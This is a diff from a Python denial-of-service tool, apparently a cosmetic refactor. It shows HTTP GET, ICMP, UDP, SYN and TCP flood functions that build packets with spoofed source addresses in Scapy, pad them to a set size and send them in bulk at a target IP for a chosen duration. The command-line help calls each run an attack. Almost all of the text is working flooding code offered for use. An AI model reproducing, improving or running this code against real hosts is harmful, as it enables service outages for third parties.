@@ -183,7 +183,7 @@ async def http_get_flood(args):
         async with aiohttp.ClientSession(timeout=timeout_info) as session:
             await statuscode(session, args)
             start_time = time.time()
-            useragent = user_agent()
+            useragent= user_agent()
             while True:
                 if time.time() - start_time >= args.duration:
                     break
@@ -221,10 +221,7 @@ async def icmpflood(args):
             if time.time() - start_time >= args.duration:
                 break
             source_ip = source_helper(args)    
-            base_packet = IP(src=source_ip,
-                             dst=args.target_ip,
-                             ttl=args.ttl
-                             )/ICMP()
+            base_packet = IP(src=source_ip, dst=args.target_ip, ttl=args.ttl)/ICMP()
             header_size = len(bytes(base_packet))
             payload_size = max(0, args.weight - header_size)
             payload = b"A" * payload_size
@@ -281,15 +278,11 @@ async def udp_flood(args):
             if time.time() - start_time >= args.duration:
                 break
             source_ip = source_helper(args)    
-            udp_ip_pkt = IP(src=source_ip,
-                            dst=args.target_ip,
-                            ttl=args.ttl
-                            )
-            udp_pkt = UDP(dport = args.port, sport = 12345)
-            udp_header  = len(bytes(udp_ip_pkt/udp_pkt))
-            udp_payload = max(0, args.weight - udp_header)
-            Aweight = b"A" * udp_payload
-            packet = udp_ip_pkt/udp_pkt/Raw(Aweight)          
+            base_packet = IP(src=source_ip, dst=args.target_ip, ttl=args.ttl)/UDP(dport=args.port, sport=12345)
+            header_size = len(bytes(base_packet))
+            payload_size = max(0, args.weight - header_size)
+            payload = b"A" * payload_size
+            packet = base_packet / Raw(payload)          
             tasks = [asyncio.to_thread(send, packet, verbose=False) for i in range(args.quantity)]
             await asyncio.gather(*tasks)
             print("sent", args.quantity, "packets to ", args.target_ip)
@@ -312,16 +305,11 @@ async def synflood(args):
             if time.time() - start_time >= args.duration:
                 break
             source_ip = source_helper(args)    
-            ip_pkt = IP(
-                src=source_ip,
-                dst=args.target_ip,
-                ttl=args.ttl
-            )
-            tcp = TCP(dport=args.port, sport=12345, flags="S")
-            header = len(bytes(ip_pkt/tcp))
-            payload = max(0, args.weight - header)
-            payload_weight = b"A" * payload 
-            packet = ip_pkt / tcp / Raw(payload_weight)
+            base_packet = IP(src=source_ip, dst=args.target_ip, ttl=args.ttl)/TCP(dport=args.port, sport=12345, flags="S")
+            header_size = len(bytes(base_packet))
+            payload_size = max(0, args.weight - header_size)
+            payload = b"A" * payload_size
+            packet = base_packet / Raw(payload)
             tasks = [asyncio.to_thread(send, packet, verbose=False) for i in range(args.quantity)]
             await asyncio.gather(*tasks)
             print(f"sent {args.quantity} packets to {args.target_ip}")
@@ -378,8 +366,6 @@ tcp_parser.add_argument("--delay", type=int, default=1, help="delay after each b
 tcp_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)")
 tcp_parser.add_argument("--timeout", type=int, default=2, help="tcp connection timeout")
 
-
-
 if __name__ == "__main__":
     args = parser.parse_args()
     if args.command == "httpflood":
@@ -399,5 +385,4 @@ if __name__ == "__main__":
     elif args.command == "tcpflood":
         ip_validation_target(args)
         asyncio.run(tcp_flood(args))
-
 
